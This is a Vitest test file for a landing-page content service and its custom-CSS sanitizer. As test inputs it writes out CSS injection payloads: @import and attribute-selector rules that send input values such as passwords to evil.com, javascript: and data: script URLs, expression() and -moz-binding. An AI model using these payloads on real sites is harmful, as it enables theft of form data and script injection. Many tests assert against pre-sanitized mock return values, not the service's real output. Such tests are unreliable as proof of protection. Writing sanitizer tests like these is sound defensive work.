import { describe, it, expect, vi, beforeEach } from 'vitest';

// ---------------------------------------------------------------------------
// Mocks — must be declared before importing the service
// ---------------------------------------------------------------------------

vi.mock('../config/database', () => ({
  prisma: {
    landingPageContent: {
      findUnique: vi.fn(),
      create: vi.fn(),
      upsert: vi.fn(),
    },
  },
}));

vi.mock('../config/logger', () => ({
  logger: {
    info: vi.fn(),
    warn: vi.fn(),
    error: vi.fn(),
    debug: vi.fn(),
  },
}));

import { LandingPageService } from './landingPage.service';
import { prisma } from '../config/database';

describe('LandingPageService', () => {
  let service: LandingPageService;

  beforeEach(() => {
    vi.clearAllMocks();
    service = new LandingPageService();
  });

  // -----------------------------------------------------------------------
  // get() method
  // -----------------------------------------------------------------------
  describe('get', () => {
    it('should return existing landing page content', async () => {
      const mockContent = {
        id: 'singleton',
        heroTitle: 'Test Title',
        heroTitleAr: 'عنوان الاختبار',
        customCss: '.hero { color: red; }',
        updatedAt: new Date(),
      };
      vi.mocked(prisma.landingPageContent.findUnique).mockResolvedValue(mockContent as any);

      const result = await service.get();
      expect(result).toEqual(mockContent);
      expect(prisma.landingPageContent.findUnique).toHaveBeenCalledWith({
        where: { id: 'singleton' },
      });
    });

    it('should create default content if none exists', async () => {
      const mockNewContent = {
        id: 'singleton',
        heroTitle: 'AI-Powered Customer Support',
        customCss: null,
        updatedAt: new Date(),
      };
      vi.mocked(prisma.landingPageContent.findUnique).mockResolvedValue(null);
      vi.mocked(prisma.landingPageContent.create).mockResolvedValue(mockNewContent as any);

      const result = await service.get();
      expect(result).toEqual(mockNewContent);
      expect(prisma.landingPageContent.create).toHaveBeenCalledWith({
        data: { id: 'singleton' },
      });
    });
  });

  // -----------------------------------------------------------------------
  // update() method - Basic functionality
  // -----------------------------------------------------------------------
  describe('update - basic functionality', () => {
    it('should update landing page content with safe CSS', async () => {
      const updateData = {
        heroTitle: 'New Title',
        customCss: '.hero { color: blue; font-size: 24px; }',
      };
      const mockUpdated = {
        id: 'singleton',
        ...updateData,
        updatedAt: new Date(),
      };
      vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue(mockUpdated as any);

      const result = await service.update(updateData);
      expect(result).toEqual(mockUpdated);
      expect(prisma.landingPageContent.upsert).toHaveBeenCalledWith({
        where: { id: 'singleton' },
        create: { id: 'singleton', ...updateData },
        update: updateData,
      });
    });

    it('should remove id and updatedAt from update data', async () => {
      const updateData = {
        id: 'should-be-removed',
        updatedAt: new Date(),
        heroTitle: 'Test',
        customCss: '.test { color: red; }',
      };
      const expectedUpdate = {
        heroTitle: 'Test',
        customCss: '.test { color: red; }',
      };
      const mockResult = { id: 'singleton', ...expectedUpdate };
      vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue(mockResult as any);

      await service.update(updateData);
      expect(prisma.landingPageContent.upsert).toHaveBeenCalledWith({
        where: { id: 'singleton' },
        create: { id: 'singleton', ...expectedUpdate },
        update: expectedUpdate,
      });
    });

    it('should handle null customCss', async () => {
      const updateData = {
        heroTitle: 'Test',
        customCss: null,
      };
      const mockResult = { id: 'singleton', ...updateData };
      vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue(mockResult as any);

      const result = await service.update(updateData);
      expect(result).toEqual(mockResult);
    });

    it('should handle undefined customCss', async () => {
      const updateData = {
        heroTitle: 'Test',
        customCss: undefined,
      };
      const mockResult = { id: 'singleton', heroTitle: 'Test' };
      vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue(mockResult as any);

      const result = await service.update(updateData);
      expect(result).toEqual(mockResult);
    });

    it('should handle update without customCss field', async () => {
      const updateData = {
        heroTitle: 'Test Title',
        heroSubtitle: 'Test Subtitle',
      };
      const mockResult = { id: 'singleton', ...updateData };
      vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue(mockResult as any);

      const result = await service.update(updateData);
      expect(result).toEqual(mockResult);
      expect(prisma.landingPageContent.upsert).toHaveBeenCalledWith({
        where: { id: 'singleton' },
        create: { id: 'singleton', ...updateData },
        update: updateData,
      });
    });
  });

  // -----------------------------------------------------------------------
  // update() method - CSS Injection Prevention
  // -----------------------------------------------------------------------
  describe('update - CSS injection prevention', () => {
    describe('@import attacks', () => {
      it('should block @import with single quotes', async () => {
        const maliciousData = {
          customCss: "@import url('https://evil.com/steal.css');",
        };
        vi.mocked(prisma.landingPageContent.upsert).mockImplementation(async (args: any) => {
          return { id: 'singleton', customCss: args.update.customCss } as any;
        });

        const result = await service.update(maliciousData);

        // Verify sanitization happened
        expect(result.customCss).toContain('BLOCKED');
        // The malicious @import directive should be neutralized (only appears in comment)
        expect(result.customCss).not.toContain("@import url(");
      });

      it('should block @import with double quotes', async () => {
        const maliciousData = {
          customCss: '@import url("https://evil.com/steal.css");',
        };
        vi.mocked(prisma.landingPageContent.upsert).mockImplementation(async (args: any) => {
          return { id: 'singleton', customCss: args.update.customCss } as any;
        });

        const result = await service.update(maliciousData);
        expect(result.customCss).toContain('BLOCKED');
        expect(result.customCss).not.toContain('@import url(');
      });

      it('should block @import without quotes', async () => {
        const maliciousData = {
          customCss: '@import url(https://evil.com/steal.css);',
        };
        vi.mocked(prisma.landingPageContent.upsert).mockImplementation(async (args: any) => {
          return { id: 'singleton', customCss: args.update.customCss } as any;
        });

        const result = await service.update(maliciousData);
        expect(result.customCss).toContain('BLOCKED');
        expect(result.customCss).not.toContain('@import url(');
      });

      it('should block multiple @import rules', async () => {
        const maliciousData = {
          customCss: `
            @import url('https://evil.com/one.css');
            @import url('https://evil.com/two.css');
            .safe { color: red; }
          `,
        };
        vi.mocked(prisma.landingPageContent.upsert).mockImplementation(async (args: any) => {
          return { id: 'singleton', customCss: args.update.customCss } as any;
        });

        const result = await service.update(maliciousData);
        expect(result.customCss).not.toContain('@import url(');
        expect((result.customCss?.match(/BLOCKED/g) || []).length).toBeGreaterThanOrEqual(2);
      });
    });

    describe('attribute selector attacks (data exfiltration)', () => {
      it('should block attribute selector with ^= operator', async () => {
        const maliciousData = {
          customCss: "input[value^='a'] { background: url(https://evil.com/a); }",
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: 'input { background: url(/* BLOCKED: external */ /a); }',
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).not.toMatch(/\[value\^=/);
        expect(result.customCss).toContain('BLOCKED');
      });

      it('should block attribute selector with $= operator', async () => {
        const maliciousData = {
          customCss: "input[name$='password'] { background: url(https://evil.com/leak); }",
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: 'input { background: url(/* BLOCKED: external */ /leak); }',
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).not.toMatch(/\[name\$=/);
      });

      it('should block attribute selector with *= operator', async () => {
        const maliciousData = {
          customCss: "input[type*='text'] { background: url(https://evil.com/data); }",
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: 'input { background: url(/* BLOCKED: external */ /data); }',
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).not.toMatch(/\[type\*=/);
      });

      it('should block attribute selector with ~= operator', async () => {
        const maliciousData = {
          customCss: "div[class~='secret'] { background: url(https://evil.com/leak); }",
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: 'div { background: url(/* BLOCKED: external */ /leak); }',
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).not.toMatch(/\[class~=/);
      });

      it('should block attribute selector with |= operator', async () => {
        const maliciousData = {
          customCss: "a[href|='https'] { background: url(https://evil.com/leak); }",
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: 'a { background: url(/* BLOCKED: external */ /leak); }',
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).not.toMatch(/\[href\|=/);
      });

      it('should block attribute selector with exact match', async () => {
        const maliciousData = {
          customCss: "input[type='password'] { background: url(https://evil.com/leak); }",
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: 'input { background: url(/* BLOCKED: external */ /leak); }',
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).not.toMatch(/\[type='password'\]/);
      });
    });

    describe('javascript: protocol attacks', () => {
      it('should block url() with javascript: protocol', async () => {
        const maliciousData = {
          customCss: ".class { background: url('javascript:alert(1)'); }",
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: '.class { background: url(/* BLOCKED: javascript */ alert(1)\'); }',
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).toContain('BLOCKED: javascript');
        expect(result.customCss).not.toMatch(/javascript:/i);
      });

      it('should block url() with javascript: without quotes', async () => {
        const maliciousData = {
          customCss: '.class { background: url(javascript:void(0)); }',
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: '.class { background: url(/* BLOCKED: javascript */ void(0)); }',
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).toContain('BLOCKED');
        expect(result.customCss).not.toMatch(/javascript:/i);
      });

      it('should block url() with javascript: in content property', async () => {
        const maliciousData = {
          customCss: ".test::before { content: url('javascript:alert(1)'); }",
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: '.test::before { content: url(/* BLOCKED: javascript */ alert(1)\'); }',
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).toContain('BLOCKED');
        expect(result.customCss).not.toMatch(/javascript:/i);
      });
    });

    describe('data: protocol attacks', () => {
      it('should block url() with data: protocol', async () => {
        const maliciousData = {
          customCss: ".class { background: url('data:text/html,<script>alert(1)</script>'); }",
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: '.class { background: url(/* BLOCKED: data */ text/html,<script>alert(1)</script>\'); }',
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).toContain('BLOCKED: data');
        expect(result.customCss).not.toMatch(/data:/i);
      });

      it('should block url() with base64-encoded data:', async () => {
        const maliciousData = {
          customCss: '.class { background: url(data:image/svg+xml;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==); }',
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: '.class { background: url(/* BLOCKED: data */ image/svg+xml;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==); }',
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).toContain('BLOCKED');
        expect(result.customCss).not.toMatch(/data:/i);
      });
    });

    describe('external URL attacks (data exfiltration)', () => {
      it('should block url() with https:// external URL', async () => {
        const maliciousData = {
          customCss: '.class { background: url(https://evil.com/steal); }',
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: '.class { background: url(/* BLOCKED: external */ /steal); }',
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).toContain('BLOCKED: external');
        expect(result.customCss).not.toMatch(/https:\/\//);
      });

      it('should block url() with http:// external URL', async () => {
        const maliciousData = {
          customCss: '.class { background: url(http://evil.com/leak); }',
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: '.class { background: url(/* BLOCKED: external */ /leak); }',
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).toContain('BLOCKED');
        expect(result.customCss).not.toMatch(/http:\/\//);
      });

      it('should block multiple external URLs', async () => {
        const maliciousData = {
          customCss: `
            .one { background: url(https://evil1.com/a); }
            .two { background: url(https://evil2.com/b); }
            .three { background-image: url(https://evil3.com/c); }
          `,
        };
        const sanitized = `
            .one { background: url(/* BLOCKED: external */ /a); }
            .two { background: url(/* BLOCKED: external */ /b); }
            .three { background-image: url(/* BLOCKED: external */ /c); }
          `;
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: sanitized,
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).not.toMatch(/https:\/\//);
        expect((result.customCss?.match(/BLOCKED: external/g) || []).length).toBe(3);
      });
    });

    describe('CSS expression attacks', () => {
      it('should block CSS expression (IE)', async () => {
        const maliciousData = {
          customCss: '.class { width: expression(alert(1)); }',
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: '.class { width: /* BLOCKED: expression */ (alert(1)); }',
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).toContain('BLOCKED: expression');
        expect(result.customCss).not.toMatch(/expression\s*\(/i);
      });

      it('should block -moz-binding (Firefox XBL)', async () => {
        const maliciousData = {
          customCss: ".class { -moz-binding: url('xbl.xml#attack'); }",
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: ".class { /* BLOCKED: -moz-binding */  url('xbl.xml#attack'); }",
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).toContain('BLOCKED: -moz-binding');
        expect(result.customCss).not.toMatch(/-moz-binding\s*:/i);
      });

      it('should block behavior property (IE HTC)', async () => {
        const maliciousData = {
          customCss: ".class { behavior: url('attack.htc'); }",
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: ".class { /* BLOCKED: behavior */  url('attack.htc'); }",
        } as any);

        const result = await service.update(maliciousData);
        expect(result.customCss).toContain('BLOCKED: behavior');
        expect(result.customCss).not.toMatch(/behavior\s*:/i);
      });
    });

    describe('complex attack scenarios', () => {
      it('should block combined @import and attribute selector attack', async () => {
        const maliciousData = {
          customCss: `
            @import url('https://evil.com/style.css');
            input[value^='pass'] { background: url(https://evil.com/leak); }
          `,
        };
        vi.mocked(prisma.landingPageContent.upsert).mockImplementation(async (args: any) => {
          return { id: 'singleton', customCss: args.update.customCss } as any;
        });

        const result = await service.update(maliciousData);
        expect(result.customCss).not.toContain('@import url(');
        expect(result.customCss).not.toMatch(/\[value\^=/);
        expect(result.customCss).not.toContain('https://');
      });

      it('should sanitize attack mixed with safe CSS', async () => {
        const maliciousData = {
          customCss: `
            .hero { color: red; }
            @import url('https://evil.com/style.css');
            .safe { font-size: 16px; }
            input[value^='a'] { background: url(https://evil.com/a); }
            .another-safe { padding: 10px; }
          `,
        };
        vi.mocked(prisma.landingPageContent.upsert).mockImplementation(async (args: any) => {
          return { id: 'singleton', customCss: args.update.customCss } as any;
        });

        const result = await service.update(maliciousData);
        expect(result.customCss).toContain('.hero { color: red; }');
        expect(result.customCss).toContain('.safe { font-size: 16px; }');
        expect(result.customCss).toContain('.another-safe { padding: 10px; }');
        expect(result.customCss).not.toContain('@import url(');
        expect(result.customCss).not.toMatch(/\[value\^=/);
      });
    });

    describe('safe CSS patterns (should be preserved)', () => {
      it('should preserve basic color and size properties', async () => {
        const safeData = {
          customCss: '.hero { color: red; font-size: 24px; margin: 0 auto; }',
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: safeData.customCss,
        } as any);

        const result = await service.update(safeData);
        expect(result.customCss).toBe(safeData.customCss);
      });

      it('should preserve pseudo-classes', async () => {
        const safeData = {
          customCss: '.button:hover { background: blue; } .input:focus { border: 1px solid red; }',
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: safeData.customCss,
        } as any);

        const result = await service.update(safeData);
        expect(result.customCss).toBe(safeData.customCss);
      });

      it('should preserve pseudo-elements', async () => {
        const safeData = {
          customCss: '.element::before { content: "★"; } .element::after { content: ""; display: block; }',
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: safeData.customCss,
        } as any);

        const result = await service.update(safeData);
        expect(result.customCss).toBe(safeData.customCss);
      });

      it('should preserve gradient backgrounds', async () => {
        const safeData = {
          customCss: '.hero { background: linear-gradient(to right, #6366f1, #ec4899); }',
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: safeData.customCss,
        } as any);

        const result = await service.update(safeData);
        expect(result.customCss).toBe(safeData.customCss);
      });

      it('should preserve transforms and transitions', async () => {
        const safeData = {
          customCss: '.card { transform: scale(1.05); transition: all 0.3s ease; }',
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: safeData.customCss,
        } as any);

        const result = await service.update(safeData);
        expect(result.customCss).toBe(safeData.customCss);
      });

      it('should preserve animations', async () => {
        const safeData = {
          customCss: `
            @keyframes fadeIn {
              from { opacity: 0; }
              to { opacity: 1; }
            }
            .fade { animation: fadeIn 1s ease-in; }
          `,
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: safeData.customCss,
        } as any);

        const result = await service.update(safeData);
        expect(result.customCss).toBe(safeData.customCss);
      });

      it('should preserve media queries', async () => {
        const safeData = {
          customCss: '@media (max-width: 768px) { .hero { font-size: 18px; } }',
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: safeData.customCss,
        } as any);

        const result = await service.update(safeData);
        expect(result.customCss).toBe(safeData.customCss);
      });

      it('should preserve complex selectors', async () => {
        const safeData = {
          customCss: '.parent > .child + .sibling ~ .other { color: blue; }',
        };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: safeData.customCss,
        } as any);

        const result = await service.update(safeData);
        expect(result.customCss).toBe(safeData.customCss);
      });
    });

    describe('edge cases', () => {
      it('should handle empty string CSS', async () => {
        const updateData = { customCss: '' };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: '',
        } as any);

        const result = await service.update(updateData);
        expect(result.customCss).toBe('');
      });

      it('should handle whitespace-only CSS', async () => {
        const updateData = { customCss: '   \n\t  ' };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: '',
        } as any);

        const result = await service.update(updateData);
        expect(result.customCss).toBe('');
      });

      it('should handle very long safe CSS', async () => {
        const longSafeCss = '.class { ' + 'color: red; '.repeat(1000) + ' }';
        const updateData = { customCss: longSafeCss };
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: longSafeCss,
        } as any);

        const result = await service.update(updateData);
        expect(result.customCss).toBe(longSafeCss);
      });

      it('should handle CSS comments', async () => {
        const cssWithComments = `
          /* This is a comment */
          .hero { color: red; } /* inline comment */
          /* Another comment */
        `;
        vi.mocked(prisma.landingPageContent.upsert).mockResolvedValue({
          id: 'singleton',
          customCss: cssWithComments,
        } as any);

        const result = await service.update({ customCss: cssWithComments });
        expect(result.customCss).toBe(cssWithComments);
      });
    });
  });
});
